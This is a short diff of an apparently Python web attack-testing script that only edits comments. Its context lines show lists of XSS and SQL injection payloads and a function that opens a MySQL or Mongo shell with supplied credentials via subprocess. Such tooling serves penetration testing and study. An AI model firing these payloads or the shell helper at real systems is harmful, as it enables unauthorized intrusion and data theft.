@@ -9,7 +9,6 @@ import subprocess
 
 # Payloads
 xss_payloads = [
-    # Lista extensa de payloads XSS
     "<script>alert('XSS')</script>",
     "\"><script>alert('XSS')</script>",
     "'\"><img src=x onerror=alert('XSS')>",
@@ -32,7 +31,6 @@ xss_payloads = [
 ]
 
 sql_payloads = [
-    # Lista extensa de payloads SQL Injection
     "' OR '1'='1",
     "\" OR \"1\"=\"1",
     "' OR '1'='1' --",
@@ -176,6 +174,7 @@ def open_database_shell(username, password, database_name, table_name):
     mongo_command = f"mongo --username {username} --password {password} --authenticationDatabase {database_name} --eval 'db.{table_name}.find();'"
     
     # Example usage
+    # This has to be changed depeding on the type of database (mysql, postgres, mongo)
     subprocess.run(["gnome-terminal", "--", "bash", "-c", mysql_command])  # For Linux with GNOME Terminal
     # subprocess.run(["cmd", "/c", mysql_command])  # For Windows
 
